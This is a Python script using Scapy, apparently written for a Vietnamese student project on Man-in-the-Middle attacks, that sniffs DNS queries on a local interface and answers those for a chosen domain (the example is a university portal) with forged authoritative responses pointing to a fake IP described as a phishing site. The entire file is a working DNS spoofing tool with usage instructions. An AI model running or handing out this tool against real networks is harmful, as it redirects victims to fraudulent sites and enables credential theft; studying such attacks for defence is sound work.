#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Kịch bản Tấn công DNS Spoofing (DNS Cache Poisoning / Fake Response)
Tác giả: Nguyễn Thị Kỳ Duyên (MSSV: 0023410647 - Lớp: ĐHCNTT23B-CS)
Đề tài: Nghiên cứu kỹ thuật khai thác và phòng chống tấn công Man-in-the-Middle

Cách dùng:
    sudo python3 dns_spoof.py -d "portal.dthu.edu.vn" -f 192.168.10.50 -i eth0
"""

import argparse
import sys
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send

def create_dns_response(pkt, fake_ip, target_domain):
    """Tạo gói tin DNS Response giả mạo trả lời truy vấn của nạn nhân."""
    if pkt.haslayer(DNSQR):
        qname = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
        # Kiểm tra xem tên miền nạn nhân hỏi có khớp với mục tiêu tấn công không
        if target_domain.lower() in qname.lower():
            print(f"[!] Bắt được truy vấn DNS cho: {qname} từ {pkt[IP].src}")
            # Xây dựng gói tin phản hồi giả mạo
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=pkt[DNSQR].qname, ttl=300, rdata=fake_ip))
            send(spoofed_pkt, verbose=False)
            print(f"[+] Đã gửi gói DNS giả mạo: {qname} -> {fake_ip}")

def main():
    parser = argparse.ArgumentParser(description="Kịch bản thực nghiệm DNS Spoofing")
    parser.add_argument("-d", "--domain", required=True, help="Tên miền mục tiêu cần đầu độc (ví dụ: portal.dthu.edu.vn)")
    parser.add_argument("-f", "--fake-ip", required=True, help="Địa chỉ IP giả mạo mà DNS sẽ trả về (IP Web lừa đảo)")
    parser.add_argument("-i", "--interface", default="eth0", help="Giao diện mạng lắng nghe (Mặc định: eth0)")
    args = parser.parse_args()

    domain = args.domain
    fake_ip = args.fake_ip
    iface = args.interface

    print("=" * 65)
    print("   CÔNG CỤ THỰC NGHIỆM DNS SPOOFING (DNS CACHE POISONING)           ")
    print("   Đề tài: Nghiên cứu kỹ thuật khai thác & phòng chống MitM         ")
    print("=" * 65)
    print(f"[*] Tên miền mục tiêu : {domain}")
    print(f"[*] Địa chỉ IP giả mạo: {fake_ip}")
    print(f"[*] Lắng nghe trên cổng: UDP 53 (Giao diện: {iface})")
    print("[*] Đang chờ gói tin DNS Query... Nhấn Ctrl+C để dừng.")

    try:
        sniff(filter="udp and port 53", iface=iface,
              prn=lambda pkt: create_dns_response(pkt, fake_ip, domain), store=0)
    except KeyboardInterrupt:
        print("\n[+] Đã dừng công cụ DNS Spoofing an toàn.")

if __name__ == "__main__":
    main()
